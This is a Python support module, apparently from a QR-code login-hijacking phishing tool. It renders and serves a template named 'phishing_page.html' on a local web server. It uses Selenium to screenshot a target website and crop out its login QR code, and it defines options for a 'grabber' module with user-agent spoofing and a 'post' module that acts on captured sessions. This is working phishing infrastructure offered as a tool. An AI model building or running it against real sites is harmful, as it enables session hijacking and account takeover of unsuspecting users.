#!/usr/bin/python3.7
import os, random, socketserver, http.server, _thread as thread
from jinja2 import Environment, PackageLoader, FileSystemLoader
from binascii import a2b_base64
from PIL import Image
from . import Settings
from selenium.webdriver.common.by import By

class server:
    def __init__(self, template_name="phishing_page.html", *args, **kwargs):
        self.templates_dir = os.path.join(Settings.path,"core","templates")
        env = Environment(loader=FileSystemLoader(searchpath=self.templates_dir))
        template = env.get_template(template_name)
        self.html = template.render(*args,**kwargs)
        self.name = kwargs["name"]
        self.port = kwargs["port"]

    def start_serving(self,host="0.0.0.0"):
        serve_dir = os.path.join(Settings.path,"core","www",self.name)
        f = open( os.path.join(serve_dir,"index.html"),"w")
        f.write(self.html)
        f.close()
        class ReusableTCPServer(socketserver.TCPServer):
            allow_reuse_address = True
            logging = False
        class MyHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=serve_dir, **kwargs)
            def log_message(self, format, *args):
                if self.server.logging:
                    http.server.SimpleHTTPRequestHandler.log_message(self, format, *args)

        self.httpd = ReusableTCPServer( (host, self.port), MyHandler)
        t = thread.start_new_thread(self.httpd.serve_forever, ())

    def stop_web_server(self):
        self.httpd.socket.close()

class misc:
    def Screenshot( browser, img_xpath, name): # PicName, location, size):
        # Take a screenshot to the page then cut the QR image
        img_path  = os.path.join(Settings.path, "core", "www", name, "full.png")
        imgObject = browser.find_element(By.XPATH, img_xpath)      # Getting the image element
        browser.save_screenshot(img_path)                           # Taking screenshot to the whole page
        img = Image.open(img_path)
        left,top = imgObject.location['x'],imgObject.location['y']  # Getting the image exact location (1)
        right = left + imgObject.size['width']                      # (2)
        bottom = top + imgObject.size['height']                     # (3)
        box = (int(left), int(top), int(right), int(bottom))        # Defines crop points
        final = img.crop(box)                                       # Croping the specific part we need to crop
        final.load()
        final.save(img_path.replace("full","tmp"))                  # Overwritting the full screenshot image with the cropped one

    def base64_to_image( base64_data):
        # Becomes useful if the targeted website is loading the image from a base64 string
        return a2b_base64( base64_data.replace("data:image/png;base64,","") )

    def gen_random():
        # Generate a random number to use in file naming
        return str( random.randint(1,100)+random.randint(1,1000) )

# Options format: [Required or not, option_description, default_value]
# Required     --> 1 # Means that it must have value
# Not required --> 0 # Means that it could have value or not
class types:
    class grabber:
        options = {
            "port":[1,"The local port to listen on.",80],
            "host":[1,"The local host to listen on.","0.0.0.0"],
            "useragent":[1,"Make useragent is the (default) one, a (random) generated useragent or a specifed useragent","(default)"]
        }

    class post:
        options = {
            "session_id":[1,"Session id to run the module on",""]
        }
